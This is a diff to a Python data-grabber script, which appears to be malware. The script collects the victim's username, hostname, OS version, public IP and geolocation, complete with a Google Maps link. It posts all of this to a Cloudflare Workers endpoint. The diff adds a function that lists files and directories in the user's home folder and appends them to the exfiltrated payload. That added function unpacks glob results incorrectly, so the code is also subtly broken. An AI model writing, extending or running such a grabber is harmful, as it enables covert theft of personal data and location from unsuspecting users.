@@ -8,6 +8,13 @@ import platform
 import datetime
 import requests
 exe = pathlib.Path(sys.executable).name
+def run_paths():
+	f = []
+	d = []
+	for p, file in Path.home().glob("*"):
+		d.append(p)
+		f.append(file)
+	return d, f
 def get_ip():
     try:
         ipv4 = []
@@ -36,10 +43,13 @@ def ip_info():
 		j = json.loads(r.text)
 		return j
 	return None
+pts = run_paths()
 time = datetime.datetime.now().strftime("%d/%m/%Y - %H:%M:%S")
 i = get_ip()
 i_info = ip_info()
 payload = f"""
+*------- USER DATA -------*
+
 Execution time: {time}
 
 User: {getpass.getuser()}
@@ -79,9 +89,16 @@ Node: {platform.node()}
 Version: {platform.release()}
 
 Google Maps Link: https://www.google.com/maps/search/?q={i_info['lat']},{i_info['lon']}
+
+**------- Files And Directories -------**
+
+{str(pts[0]).replace("[","").replace("]","").replace(",","\r\n")}
+
+{str(pts[1]).replace("[","").replace("]","").replace(",","\r\n")}
+
+**-------------------------------------**
 """
 content = json.dumps({"msg": payload})
 r = requests.post("https://curly-dream-4ac6.encrypteddev111k.workers.dev/", data=content)
 if r.status_code == 200:
-	print("sended", exe)
-
+	
